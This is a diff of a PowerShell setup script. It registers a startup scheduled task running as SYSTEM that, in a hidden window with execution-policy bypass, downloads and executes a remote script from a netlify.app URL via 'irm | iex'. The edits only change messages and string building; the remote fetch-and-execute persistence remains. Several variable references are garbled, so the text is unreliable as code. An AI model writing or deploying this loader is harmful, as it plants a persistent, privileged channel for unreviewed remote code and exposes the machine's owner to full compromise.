@@ -4,8 +4,7 @@ $ScriptUrl = "https://ahmadsan.netlify.app/SetExt.ps1"
 
 # 1. Check for Administrator privileges
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Warning "Administrator rights required! Please right-click and 'Run as administrator'."
-    Read-Host "Press Enter to exit"
+    Write-Warning "Administrator rights required! Please run PowerShell as Administrator."
     Exit
 }
 
@@ -17,12 +16,12 @@ if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName \(TaskName -Confirm:\)false
 }
 
-# 3. Create the new scheduled task parameters
-\(action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm\)ScriptUrl | iex`""
+# 3. Create the new scheduled task parameters (using safer string concatenation)
+\(TaskArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm ' +\)ScriptUrl + ' | iex"'
+\(action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument\)TaskArgs
 $trigger = New-ScheduledTaskTrigger -AtStartup
 
-# 4. Register the task to run as the SYSTEM account
-Register-ScheduledTask -TaskName \(TaskName -Action\)action -Trigger$trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force
+# 4. Register the task
+Register-ScheduledTask -TaskName \(TaskName -Action\)action -Trigger $trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force
 
-Write-Host "Success! The task '$TaskName' is now active and will run on startup." -ForegroundColor Green
-Read-Host "Press Enter to close"
+Write-Host "Success! The task '$TaskName' is now active." -ForegroundColor Green
